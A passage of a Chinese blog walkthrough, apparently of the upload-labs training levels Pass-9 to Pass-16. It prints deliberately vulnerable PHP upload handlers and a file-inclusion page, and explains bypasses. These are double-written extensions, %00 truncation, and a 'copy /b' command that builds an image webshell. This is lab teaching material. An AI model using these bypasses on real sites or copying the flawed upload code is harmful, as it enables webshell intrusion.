class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>代码先是去除文件名前后的空格，再去除文件名最后所有的<code>.</code>，再通过strrchar函数来寻找<code>.</code>来确认文件名的后缀，但是最后保存文件的时候没有重命名而使用的原始的文件名，导致可以利用1.php. .（点+空格+点）来绕过<br><img src="https://img-blog.csdnimg.cn/20190618224551741.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2019061822461747.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="Pass-10-双写绕过"><a href="#Pass-10-双写绕过" class="headerlink" title="Pass-10-双写绕过"></a>Pass-10-双写绕过</h2><p><strong>源码：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"></span><br><span class="line">        $file_name = trim($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        $file_name = str_ireplace($deny_ext,<span class="string">&quot;&quot;</span>, $file_name);</span><br><span class="line">        $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.$file_name;        </span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">            $is_upload = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">1234567891011121314151617181920</span></span><br></pre></td></tr></table></figure>

<p>黑名单过滤，将黑名单里的后缀名替换为空且只替换一次，因此可以用双写绕过<br><img src="https://img-blog.csdnimg.cn/20190619082922259.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190619083032640.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="Pass-11-00截断"><a href="#Pass-11-00截断" class="headerlink" title="Pass-11-00截断"></a>Pass-11-00截断</h2><p><strong>源码：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    $file_ext = substr($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],strrpos($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        $img_path = $_GET[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.$file_ext;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">12345678910111213141516171819</span></span><br></pre></td></tr></table></figure>

<p>白名单判断，但$img_path是直接拼接，因此可以利用%00截断绕过。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$img_path = $_GET[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.$file_ext;</span><br><span class="line">截断条件：php版本小于<span class="number">5.3</span><span class="number">.4</span>，php的magic_quotes_gpc为OFF状态</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/2019061908535953.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190619085428879.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="Pass-12-00截断"><a href="#Pass-12-00截断" class="headerlink" title="Pass-12-00截断"></a>Pass-12-00截断</h2><p><strong>源码：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    $file_ext = substr($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],strrpos($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        $img_path = $_POST[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.$file_ext;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&quot;上传失败&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">12345678910111213141516171819</span></span><br></pre></td></tr></table></figure>

<p>save_path参数通过POST方式传递，还是利用00截断，因为POST不会像GET对%00进行自动解码，所以需要在二进制中进行修改。<br><img src="https://img-blog.csdnimg.cn/2019061909071992.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/2019061909081330.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190619090907698.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="Pass-13-图片马绕过"><a href="#Pass-13-图片马绕过" class="headerlink" title="Pass-13-图片马绕过"></a>Pass-13-图片马绕过</h2><p><strong>源码：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span>(<span class="params">$filename</span>)</span>&#123;</span><br><span class="line">    $file = fopen($filename, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    $bin = fread($file, <span class="number">2</span>); <span class="comment">//只读2字节</span></span><br><span class="line">    fclose($file);</span><br><span class="line">    $strInfo = @unpack(<span class="string">&quot;C2chars&quot;</span>, $bin);    </span><br><span class="line">    $typeCode = intval($strInfo[<span class="string">&#x27;chars1&#x27;</span>].$strInfo[<span class="string">&#x27;chars2&#x27;</span>]);    </span><br><span class="line">    $fileType = <span class="string">&#x27;&#x27;</span>;    </span><br><span class="line">    <span class="keyword">switch</span>($typeCode)&#123;      </span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            $fileType = <span class="string">&#x27;jpg&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            $fileType = <span class="string">&#x27;png&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            $fileType = <span class="string">&#x27;gif&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            $fileType = <span class="string">&#x27;unknown&#x27;</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> $fileType;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    $file_type = getReailFileType($temp_file);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($file_type == <span class="string">&#x27;unknown&#x27;</span>)&#123;</span><br><span class="line">        $msg = <span class="string">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.$file_type;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">1234567891011121314151617181920212223242526272829303132333435363738394041</span></span><br></pre></td></tr></table></figure>

<p>通过读文件的前2个字节判断文件类型，因此直接上传图片马即可，制作图片马：</p>
<blockquote>
<p>copy 22.jpg /b + 1.php /a shell.jpg</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20190619092253865.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>直接访问图片并不能把图片当做PHP解析，因此还需要利用文件包含漏洞</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">##include.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">本页面存在文件包含漏洞，用于测试图片马是否能正常运行！</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">header(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line">$file = $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($file))&#123;</span><br><span class="line">    <span class="keyword">include</span> $file;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    show_source(<span class="keyword">__file__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span><span class="number">123456789101112</span></span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20190619092621502.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="Pass-14-getimagesize-图片马"><a href="#Pass-14-getimagesize-图片马" class="headerlink" title="Pass-14-getimagesize()-图片马"></a>Pass-14-getimagesize()-图片马</h2><p><strong>源码：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span>(<span class="params">$filename</span>)</span>&#123;</span><br><span class="line">    $types = <span class="string">&#x27;.jpeg|.png|.gif&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(file_exists($filename))&#123;</span><br><span class="line">        $info = getimagesize($filename);</span><br><span class="line">        $ext = image_type_to_extension($info[<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">if</span>(stripos($types,$ext)&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> $ext;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    $res = isImage($temp_file);</span><br><span class="line">    <span class="keyword">if</span>(!$res)&#123;</span><br><span class="line">        $msg = <span class="string">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).$res;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">1234567891011121314151617181920212223242526272829303132</span></span><br></pre></td></tr></table></figure>

<p>这题是用getimagesize函数判断文件类型，还是可以图片马绕过，方法同pass-13<br><img src="https://img-blog.csdnimg.cn/20190619094339987.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="Pass-15-exif-imagetype-图片马"><a href="#Pass-15-exif-imagetype-图片马" class="headerlink" title="Pass-15-exif_imagetype()-图片马"></a>Pass-15-exif_imagetype()-图片马</h2><p><strong>源码：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span>(<span class="params">$filename</span>)</span>&#123;</span><br><span class="line">    <span class="comment">//需要开启php_exif模块</span></span><br><span class="line">    $image_type = exif_imagetype($filename);</span><br><span class="line">    <span class="keyword">switch</span> ($image_type) &#123;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_GIF:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;gif&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_JPEG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;jpg&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_PNG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;png&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;    </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    $res = isImage($temp_file);</span><br><span class="line">    <span class="keyword">if</span>(!$res)&#123;</span><br><span class="line">        $msg = <span class="string">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.$res;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">123456789101112131415161718192021222324252627282930313233343536</span></span><br></pre></td></tr></table></figure>

<p>这里用到php_exif模块来判断文件类型，用图片马绕过，方法同pass-13<br><img src="https://img-blog.csdnimg.cn/20190619095026297.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="Pass-16-二次渲染绕过"><a href="#Pass-16-二次渲染绕过" class="headerlink" title="Pass-16-二次渲染绕过"></a>Pass-16-二次渲染绕过</h2><p><strong>源码：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span></span><br><span class="line">    $filename = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    $filetype = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">    $tmpname = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    $target_path=UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.basename($filename);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获得上传文件的扩展名</span></span><br><span class="line">    $fileext= substr(strrchr($filename,<span class="string">&quot;.&quot;</span>),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//判断文件后缀与类型，合法才进行上传操作</span></span><br><span class="line">    <span class="keyword">if</span>(($fileext == <span class="string">&quot;jpg&quot;</span>) &amp;&amp; ($filetype==<span class="string">&quot;image/jpeg&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            $im = imagecreatefromjpeg($target_path);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($im == <span class="literal">false</span>)&#123;</span><br><span class="line">                $msg = <span class="string">&quot;该文件不是jpg格式的图片！&quot;</span>;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).<span class="string">&quot;.jpg&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.$newfilename;</span><br><span class="line">                imagejpeg($im,$img_path);</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(($fileext == <span class="string">&quot;png&quot;</span>) &amp;&amp; ($filetype==<span class="string">&quot;image/png&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            $im = imagecreatefrompng($target_path);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($im == <span class="literal">false</span>)&#123;</span><br><span class="line">                $msg = <span class="string">&quot;该文件不是png格式的图片！&quot;</span>;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                 <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).<span class="string">&quot;.png&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.$newfilename;</span><br><span class="line">                imagepng($im,$img_path);</span><br><span class="line"></span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = <span class="literal">true</span>;               </span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(($fileext == <span class="string">&quot;gif&quot;</span>) &amp;&amp; ($filetype==<span class="string">&quot;image/gif&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            $im = imagecreatefromgif($target_path);</span><br><span class="line">            <span class="keyword">if</span>($im == <span class="literal">false</span>)&#123;</span><br><span class="line">                $msg = <span class="string">&quot;该文件不是gif格式的图片！&quot;</span>;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).<span class="string">&quot;.gif&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.$newfilename;</span><br><span class="line">                imagegif($im,$img_path);</span><br><span class="line"></span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">&quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485</span></span><br></pre></td></tr></table></figure>

